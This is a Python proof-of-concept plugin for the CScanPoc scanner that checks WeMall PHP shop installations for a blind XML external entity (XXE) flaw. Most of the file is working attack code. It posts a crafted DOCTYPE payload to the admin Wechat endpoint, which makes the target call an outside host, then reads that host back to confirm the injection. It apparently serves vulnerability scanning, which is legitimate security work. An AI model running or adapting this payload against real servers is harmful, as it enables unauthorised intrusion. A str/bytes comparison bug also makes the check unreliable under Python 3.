# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse
import random
import socket
import urllib.parse
socket.setdefaulttimeout(10)


class Vuln(ABVuln):
    vuln_id = 'WeMall_0001'  # 平台漏洞编号，留空
    name = 'WeMall微信开源PHP商城系统一处blind xxe'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-10-19'  # 漏洞公布时间
    desc = '''
        WeMall微商城系统是基于ThinkPHP技术架构，实现MVC、缓存等框架设计的微商城源码，帮助中小企业及个人迅速搭建商城系统，减少二次开发带来的成本。
        //Application\Lib\Action\Admin\WechatAction.class.php
        valid()函数，直接使用了simplexml_load_string函数。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3528/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WeMall'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8d5c709f-5c4a-4f6e-8921-564451a8165c'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def send_xml(self, url, data):
        try:
            requests.post(url, data)
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def my_poc(self, host):
        url = 'http://' + host + '/index.php?g=Admin&m=Wechat&a=index'
        key = "".join(random.sample('abcdefghijklmnopqrstuvwxyz', 6))
        value = "".join(random.sample('abcdefghijklmnopqrstuvwxyz', 6))

        data = """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE root [

            <!ENTITY % remote SYSTEM "http://pysandbox.sinaapp.com/kv?act=set&k={key}&v={value}">

            %remote;]>
            <root/>
        """

        data = data.replace('{key}', key).replace('{value}', value)
        self.send_xml(url, data)
        url = 'http://pysandbox.sinaapp.com/kv?act=get&k=' + key
        res = urllib.request.urlopen(url).read()

        if value in res:
            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                target=self.target, name=self.vuln.name))

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            o = urllib.parse.urlparse(self.target)
            host = o.hostname
            self.my_poc(host)

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
